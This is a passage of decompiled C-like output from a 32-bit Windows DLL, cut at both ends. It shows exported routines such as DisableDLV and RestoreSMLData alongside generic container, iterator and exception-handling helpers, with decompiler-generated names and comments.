  int v4[5]; // [esp+Ch] [ebp-30h] BYREF
  _DWORD v5[4]; // [esp+20h] [ebp-1Ch] BYREF
  int v6; // [esp+38h] [ebp-4h]

  v5[3] = &v3;
  sub_10010428((int)v5);
  v6 = 0;
  sub_1000EFCA();
  LOBYTE(v6) = 1;
  if ( (unsigned int)(sub_10015E65() - 6) <= 7 )
  {
    v1 = (_DWORD *)sub_10016983(0, (int)v4, 0);
    LOBYTE(v6) = 2;
    sub_10001429(dword_100BF590, (int)&unk_100BF5C0, (int)&unk_100BF5B0, v1, (int)&unk_100BF1B0, 0xCu, a1);
    LOBYTE(v6) = 1;
    sub_10016B53(v4);
    v6 = 0;
  }
  v6 = -1;
  sub_10010466(v5);
  return 1;
}
// 100BF590: using guessed type _DWORD dword_100BF590[2];
// 10003D71: using guessed type int var_30[5];

//----- (10003E10) --------------------------------------------------------
int DisableDLV()
{
  int v1; // [esp+0h] [ebp-28h] BYREF
  _DWORD v2[4]; // [esp+Ch] [ebp-1Ch] BYREF
  int v3; // [esp+24h] [ebp-4h]

  v2[3] = &v1;
  v3 = 0;
  sub_10010428((int)v2);
  LOBYTE(v3) = 1;
  sub_1000EFCA();
  sub_10004116();
  sub_1000695E();
  LOBYTE(v3) = 0;
  sub_10010466(v2);
  return 1;
}

//----- (10003E6D) --------------------------------------------------------
int __stdcall sub_10003E6D(_DWORD *a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  int v7; // eax
  _DWORD *v8; // eax
  int v9; // esi
  char v11; // [esp+8h] [ebp-60h]
  void *Block[2]; // [esp+Ch] [ebp-5Ch] BYREF
  _DWORD v13[2]; // [esp+14h] [ebp-54h] BYREF
  int v14[3]; // [esp+1Ch] [ebp-4Ch] BYREF
  int v15[3]; // [esp+28h] [ebp-40h] BYREF
  int v16[4]; // [esp+34h] [ebp-34h] BYREF
  int v17[6]; // [esp+44h] [ebp-24h] BYREF
  int v18; // [esp+64h] [ebp-4h]

  v11 = 0;
  v1 = sub_1001445F(Block);
  v18 = 0;
  sub_100140E1(dword_100BBBEC, (int)v15, 1, 1u, *(LPSECURITY_ATTRIBUTES *)(*v1 + 4));
  LOBYTE(v18) = 2;
  sub_100015D8(Block);
  v2 = sub_1001445F(Block);
  LOBYTE(v18) = 3;
  sub_100140E1(dword_100BBC18, (int)v14, 1, 1u, *(LPSECURITY_ATTRIBUTES *)(*v2 + 4));
  LOBYTE(v18) = 5;
  sub_100015D8(Block);
  sub_10004A8B(v16);
  LOBYTE(v18) = 6;
  Block[0] = operator new(0x7Au);
  LOBYTE(v18) = 7;
  if ( Block[0] )
  {
    v3 = (_DWORD *)sub_10016983(0, (int)v17, 0);
    LOBYTE(v18) = 8;
    v11 = 1;
    v4 = sub_10012ECB(
           (int)Block[0],
           (int)&unk_100BBBE4,
           (int)&unk_100BBBF4,
           (int)v15,
           (int)&unk_100BF618,
           v3,
           a1,
           (void *)1);
  }
  else
  {
    v4 = 0;
  }
  v18 = 9;
  v5 = sub_100017F0(v13, v4);
  v18 = 10;
  sub_10004BD0(v16, (int)v5);
  LOBYTE(v18) = 9;
  sub_10001834(v13);
  v18 = 6;
  if ( (v11 & 1) != 0 )
  {
    v11 &= ~1u;
    sub_10016B53(v17);
  }
  Block[0] = operator new(0x7Au);
  LOBYTE(v18) = 11;
  if ( Block[0] )
  {
    v6 = (_DWORD *)sub_10016983(0, (int)v17, 0);
    LOBYTE(v18) = 12;
    v11 |= 2u;
    v7 = sub_10012ECB(
           (int)Block[0],
           (int)&unk_100BBC10,
           (int)&unk_100BBC20,
           (int)v14,
           (int)&unk_100BF610,
           v6,
           a1,
           (void *)1);
  }
  else
  {
    v7 = 0;
  }
  v18 = 13;
  v8 = sub_100017F0(v13, v7);
  v18 = 14;
  sub_10004BD0(v16, (int)v8);
  LOBYTE(v18) = 13;
  sub_10001834(v13);
  v18 = 6;
  if ( (v11 & 2) != 0 )
    sub_10016B53(v17);
  v9 = sub_1000191E(v16, dword_100BF590, (int)&unk_100BF1B0, (char *)0xC);
  LOBYTE(v18) = 5;
  sub_10004B05(v16);
  LOBYTE(v18) = 2;
  sub_100141CF(v14);
  v18 = -1;
  sub_100141CF(v15);
  return v9;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100BBBEC: using guessed type _DWORD dword_100BBBEC[2];
// 100BBC18: using guessed type _DWORD dword_100BBC18[2];
// 100BF590: using guessed type _DWORD dword_100BF590[2];
// 10003E6D: using guessed type int var_40[3];
// 10003E6D: using guessed type int var_4C[3];
// 10003E6D: using guessed type int var_34[4];
// 10003E6D: using guessed type int var_24[6];
// 10003E6D: using guessed type _DWORD var_54[2];

//----- (100040A8) --------------------------------------------------------
int __stdcall RestoreSMLData(int a1)
{
  int v2; // [esp+0h] [ebp-28h] BYREF
  _DWORD v3[4]; // [esp+Ch] [ebp-1Ch] BYREF
  int v4; // [esp+24h] [ebp-4h]

  v3[3] = &v2;
  sub_10010428((int)v3);
  v4 = 0;
  sub_1000EFCA();
  LOBYTE(v4) = 1;
  sub_10013547((void (__stdcall *)(int))sub_10003E6D, a1);
  v4 = 0;
  sub_1001A872();
  v4 = -1;
  sub_10010466(v3);
  return 0;
}

//----- (10004116) --------------------------------------------------------
LONG sub_10004116()
{
  int v0; // eax
  int v2[3]; // [esp+0h] [ebp-18h] BYREF
  int v3; // [esp+14h] [ebp-4h]

  v0 = sub_100140E1(dword_100BF590, (int)v2, 1, 1u, 0);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v0 + 16))(v0);
  v3 = -1;
  return sub_100141CF(v2);
}
// 100BF590: using guessed type _DWORD dword_100BF590[2];
// 10004116: using guessed type int var_18[3];

//----- (1000415A) --------------------------------------------------------
_DWORD *__thiscall sub_1000415A(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_10004752(this, v3, 0);
  else
    v4 = 0;
  sub_10004FA2(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100041B7) --------------------------------------------------------
_DWORD *__thiscall sub_100041B7(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_100048C2(this, v3, 0);
  else
    v4 = 0;
  sub_10005039(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10004214) --------------------------------------------------------
_DWORD *__thiscall sub_10004214(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_10004752(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10004FA2(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10004279) --------------------------------------------------------
_DWORD *__thiscall sub_10004279(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_100048C2(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10005039(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100042DE) --------------------------------------------------------
_DWORD *__thiscall sub_100042DE(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_10004752(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10004FA2(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000435D) --------------------------------------------------------
_DWORD *__thiscall sub_1000435D(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_100048C2(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10005039(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100043DC) --------------------------------------------------------
void *__thiscall sub_100043DC(_DWORD *this)
{
  void *result; // eax

  result = &loc_10078A21;
  *this = &off_100930AC;
  *this = off_10092F20;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100930AC: using guessed type int (__thiscall *off_100930AC)(void *Block, char);

//----- (10004406) --------------------------------------------------------
int *__thiscall sub_10004406(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_100046E1(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1000445E: variable 'v5' is possibly undefined

//----- (10004479) --------------------------------------------------------
int *__thiscall sub_10004479(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10004721(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 100044D1: variable 'v5' is possibly undefined

//----- (100044EC) --------------------------------------------------------
void __thiscall sub_100044EC(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10004FE6(v2);
}

//----- (1000452A) --------------------------------------------------------
void __thiscall sub_1000452A(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10004FE6(v3);
}

//----- (1000456B) --------------------------------------------------------
void __thiscall sub_1000456B(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10004FE6(v2);
}

//----- (100045A9) --------------------------------------------------------
int __thiscall sub_100045A9(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1000507D(v4);
  return v2;
}

//----- (100045ED) --------------------------------------------------------
int __thiscall sub_100045ED(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10004FE6(v4);
  return v2;
}

//----- (10004631) --------------------------------------------------------
void __thiscall sub_10004631(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10004FE6(v1);
}

//----- (10004686) --------------------------------------------------------
_DWORD *__thiscall sub_10004686(_DWORD *Block, char a2)
{
  sub_100043DC(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100046E1) --------------------------------------------------------
int __usercall sub_100046E1@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10004721) --------------------------------------------------------
int __usercall sub_10004721@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10004752) --------------------------------------------------------
_DWORD *__thiscall sub_10004752(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100930E4;
  a2[1] = this;
  *a2 = &off_10093124;
  a2[2] = a3;
  return result;
}
// 100930E4: using guessed type int (__thiscall *off_100930E4)(void *Block, char);
// 10093124: using guessed type int (__thiscall *off_10093124)(void *Block, char);

//----- (1000478A) --------------------------------------------------------
void *__thiscall sub_1000478A(_DWORD *this)
{
  void *result; // eax

  result = &loc_10078991;
  *this = &off_10093124;
  *this = &off_100930E4;
  return result;
}
// 100930E4: using guessed type int (__thiscall *off_100930E4)(void *Block, char);
// 10093124: using guessed type int (__thiscall *off_10093124)(void *Block, char);

//----- (100047B4) --------------------------------------------------------
bool __thiscall sub_100047B4(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (100047CB) --------------------------------------------------------
BOOL __thiscall sub_100047CB(_DWORD *this)
{
  return this[2] != 0;
}

//----- (100047D5) --------------------------------------------------------
int __thiscall sub_100047D5(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10004810) --------------------------------------------------------
int __thiscall sub_10004810(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10004846) --------------------------------------------------------
int __thiscall sub_10004846(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1000486E) --------------------------------------------------------
int __thiscall sub_1000486E(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (100048A9) --------------------------------------------------------
int __thiscall sub_100048A9(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (100048C2) --------------------------------------------------------
_DWORD *__thiscall sub_100048C2(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10093104;
  a2[1] = this;
  *a2 = &off_10093144;
  a2[2] = a3;
  return result;
}
// 10093104: using guessed type int (__thiscall *off_10093104)(void *Block, char);
// 10093144: using guessed type int (__thiscall *off_10093144)(void *Block, char);

//----- (100048FA) --------------------------------------------------------
void *__thiscall sub_100048FA(_DWORD *this)
{
  void *result; // eax

  result = &loc_1007896D;
  *this = &off_10093144;
  *this = &off_10093104;
  return result;
}
// 10093104: using guessed type int (__thiscall *off_10093104)(void *Block, char);
// 10093144: using guessed type int (__thiscall *off_10093144)(void *Block, char);

//----- (10004924) --------------------------------------------------------
bool __thiscall sub_10004924(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1000493B) --------------------------------------------------------
BOOL __thiscall sub_1000493B(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10004945) --------------------------------------------------------
int __thiscall sub_10004945(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10004980) --------------------------------------------------------
int __thiscall sub_10004980(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (100049B6) --------------------------------------------------------
int __thiscall sub_100049B6(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (100049DE) --------------------------------------------------------
int __thiscall sub_100049DE(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10004A19) --------------------------------------------------------
int __thiscall sub_10004A19(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10004A32) --------------------------------------------------------
_DWORD *__thiscall sub_10004A32(_DWORD *Block, char a2)
{
  sub_1000478A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10004A4E) --------------------------------------------------------
_DWORD *__thiscall sub_10004A4E(_DWORD *Block, char a2)
{
  sub_100048FA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10004A8B) --------------------------------------------------------
_DWORD *__stdcall sub_10004A8B(_DWORD *a1)
{
  sub_100050E4(a1);
  *a1 = &off_10093050;
  sub_10005138(a1);
  return a1;
}
// 10093050: using guessed type int (__thiscall *off_10093050)(void *Block, char);

//----- (10004AC3) --------------------------------------------------------
int *__thiscall sub_10004AC3(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_10001743(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (10004B05) --------------------------------------------------------
void *__thiscall sub_10004B05(_DWORD *this)
{
  char *v2; // eax
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_10093050;
  v5 = 1;
  v2 = (char *)this[3];
  if ( v2 )
    sub_10001743(v2);
  this[3] = 0;
  v5 = -1;
  return sub_100043DC(this);
}
// 10093050: using guessed type int (__thiscall *off_10093050)(void *Block, char);

//----- (10004B66) --------------------------------------------------------
int __thiscall sub_10004B66(_DWORD *this)
{
  return this[1];
}

//----- (10004B6A) --------------------------------------------------------
_DWORD *__thiscall sub_10004B6A(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // ebx
  int v7; // eax
  _DWORD *result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B8283);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ; --i )
  {
    v7 = this[3];
    if ( i <= a3 )
      break;
    sub_10005113((_DWORD *)(v7 + 8 * i), (_DWORD *)(v7 + 8 * i - 8));
  }
  result = sub_10005113((_DWORD *)(v7 + 8 * a3), a2);
  ++this[1];
  return result;
}

//----- (10004BD0) --------------------------------------------------------
int __thiscall sub_10004BD0(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (10004BE8) --------------------------------------------------------
int __thiscall sub_10004BE8(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B82BA);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    sub_10005113((_DWORD *)(this[3] + 8 * v2), (_DWORD *)(this[3] + 8 * v2 + 8));
    ++v2;
  }
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_10005113((_DWORD *)(this[3] + 8 * v4), dword_100BF9CC);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 100BF9CC: using guessed type _DWORD dword_100BF9CC[2];

//----- (10004C3F) --------------------------------------------------------
int __thiscall sub_10004C3F(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B82BB);
  return this[3] + 8 * a2;
}

//----- (10004C5D) --------------------------------------------------------
int __thiscall sub_10004C5D(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B82BE);
  return this[3] + 8 * a2;
}

//----- (10004C7B) --------------------------------------------------------
char *__thiscall sub_10004C7B(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_10001743(v3);
  }
  return result;
}

//----- (10004CA1) --------------------------------------------------------
int __thiscall sub_10004CA1(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_10001743(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10004CC8) --------------------------------------------------------
BOOL __thiscall sub_10004CC8(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10004CD3) --------------------------------------------------------
int __thiscall sub_10004CD3(_DWORD *this, unsigned int a2)
{
  unsigned int i; // ebx
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    sub_10005113((_DWORD *)(this[3] + 8 * i), dword_100BF9CC);
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 100BF9CC: using guessed type _DWORD dword_100BF9CC[2];

//----- (10004D1D) --------------------------------------------------------
unsigned int __thiscall sub_10004D1D(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B82BF);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10004D8F) --------------------------------------------------------
unsigned int __thiscall sub_10004D8F(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
